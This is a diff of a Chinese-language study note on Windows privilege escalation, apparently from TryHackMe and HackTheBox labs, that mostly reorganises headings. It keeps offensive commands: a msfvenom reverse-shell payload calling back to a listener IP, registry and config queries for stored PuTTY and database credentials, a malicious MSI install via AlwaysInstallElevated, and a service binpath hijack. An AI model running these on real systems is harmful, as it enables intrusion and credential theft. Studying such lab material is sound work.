@@ -1,25 +1,18 @@
 # windows提权
 - [windows提权](#windows提权)
-- [理论](#理论)
-  - [THM基础](#thm基础)
-    - [反shell](#反shell)
-    - [滥用服务错误配置](#滥用服务错误配置)
-    - [滥用危险的特权](#滥用危险的特权)
-    - [滥用易受攻击的软件](#滥用易受攻击的软件)
-    - [其他提权工具](#其他提权工具)
-  - [HTB基础](#htb基础)
-    - [工具](#工具)
-    - [态势感知](#态势感知)
-    - [初始枚举](#初始枚举)
-  - [实战](#实战)
-    - [命令\&工具](#命令工具)
+  - [反shell](#反shell)
+  - [滥用服务错误配置](#滥用服务错误配置)
+  - [滥用危险的特权](#滥用危险的特权)
+  - [滥用易受攻击的软件](#滥用易受攻击的软件)
+  - [其他提权工具](#其他提权工具)
+- [实战](#实战)
+  - [命令\&工具](#命令工具)
     - [SAM文件](#sam文件)
 
-# 理论
 
-## THM基础
 
-### 反shell
+
+## 反shell
 
 生成反shell:  
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=1234 -f exe -o reverse.exe
@@ -66,13 +59,14 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 
 这是在文件上查找数据库连接字符串的快速方法：  
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
->从软件检索凭证：PuTTY
+
+**从软件检索凭证**：PuTTY
 
 要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：
 
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
->计划任务
+**计划任务**
 
 查看目标系统上的计划任务，您可能会看到计划任务丢失了其二进制文件或正在使用您可以修改的二进制文件。
 
@@ -123,7 +117,7 @@ C:\Windows\system32>whoami
 wprivesc1\taskusr1
 ``````
 
->始终安装提升
+**始终安装提升**
 
 Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，可以将它们配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能会让我们生成一个以管理员权限运行的恶意 MSI 文件。
 
@@ -146,15 +140,15 @@ C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ``````
 
 
-### 滥用服务错误配置
+## 滥用服务错误配置
 
 
 
-### 滥用危险的特权
+## 滥用危险的特权
 
-### 滥用易受攻击的软件
+## 滥用易受攻击的软件
 
-### 其他提权工具
+## 其他提权工具
 
 >WinPEAS
 
@@ -168,74 +162,13 @@ C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 
 如果目标系统上已有 Meterpreter shell，则可以使用该multi/recon/local_exploit_suggester模块列出可能影响目标系统的漏洞，并允许您提升目标系统上的权限。
 
-## HTB基础
-
-Windows 系统存在巨大的攻击面。我们可以提升权限的一些方法包括：
-
-- 滥用 Windows 组权限	
-- 滥用 Windows 用户权限
-- 绕过用户帐户控制	
-- 滥用弱服务/文件权限
-- 利用未修补的内核漏洞	
-- 凭据盗窃
-- 流量捕获	
-
-### 工具
-
-下面是HTBA提供的工具：
-- Seatbelt	 
-- winPEAS	
-- PowerUp	
-- SharpUp	
-- JAWS	
-- SessionGopher	
-- Watson	
-- LaZagne	
-- Windows Exploit Suggester - Next Generation
-- Sysinternals Suite
-
-### 态势感知
-
-**网络信息**
-
-接口、IP 地址、DNS 信息:
-```
-ipconfig /all
-```
-
-arp表：
-```
-arp -a
-```
-
-路由表：
-```
-route print
-```
-
-检查 Windows Defender 状态:
-```powershell
-Get-MpComputerStatus
-```
-
-列出 AppLocker 规则:
-```powershell
-Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-```
-
-测试 AppLocker 策略：
-```powershell
-Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
-```
-
-### 初始枚举
 
 
 
 
-## 实战
+# 实战
 
-### 命令&工具
+## 命令&工具
 
 
 
@@ -245,11 +178,11 @@ sc qc <服务名称>
 修改服务配置并将 BINARY_PATH_NAME (binpath) 设置为您创建的reverse.exe可执行文件：  
 sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
 
->启动服务
+**启动服务**
 
 net start <服务名称>
 
->accesschk.exe
+**accesschk.exe**
 
 accesschk.exe 检查某个账户对某个服务的权限
 
@@ -269,7 +202,7 @@ C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\prog
 C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
 
 
->
+
 
 ### SAM文件
 
